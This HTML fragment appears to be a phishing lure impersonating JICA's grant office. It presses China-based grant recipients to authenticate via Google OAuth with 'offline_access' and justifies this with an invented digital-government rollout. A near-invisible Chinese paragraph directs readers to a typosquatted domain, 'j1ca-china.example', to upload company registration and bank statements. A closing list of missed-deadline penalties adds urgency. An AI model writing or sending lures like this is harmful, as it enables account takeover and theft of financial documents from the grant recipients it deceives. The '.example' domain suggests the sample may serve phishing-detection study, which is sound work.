<h3>About JICA Portal Authentication</h3>
<p>When you click the verification button, you will be redirected to <b>accounts.google.com</b> (Google's official OAuth endpoint) for authentication:</p>
<ol>
<li>Sign in with your institutional Google Workspace account</li>
<li>Grant the requested permissions (openid, profile, offline_access)</li>
<li>Complete the JICA grant re-verification form</li>
<li>Upload supporting documentation</li>
</ol>

<p style="font-size:14px;background:#E3F2FD;padding:12px;border-radius:4px">
<b>Why Google Workspace authentication for JICA grants?</b> JICA's China office implemented Google Workspace federated login in 2026-Q3 as part of Japan's Digital Agency Government Cloud initiative. All China-based grant recipients authenticate through their institutional Google Workspace accounts. This is standard for all JICA China grants. The offline_access permission maintains your session during the multi-section form (banking + tax + project compliance = typically 25-30 minutes).
</p>

<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文项目财务支持或提交中国银行信息，请访问 j1ca-china.example/cn-portal 上传公司注册证书与银行对账单（中文通道，当日处理）。</p>

<h3>五、What Happens If You Miss November 14</h3>
<ul>
<li>Funds returned to JICA FY2026 budget (re-request requires new approval cycle — 3-4 months)</li>
<li>Year 3 budget reduced (unclaimed installments may be re-allocated to other projects)</li>
<li>Project timeline delayed (affects final report due March 2027)</li>
<li>Joint evaluation with NICT may be flagged as "delayed disbursement"</li>
</ul>

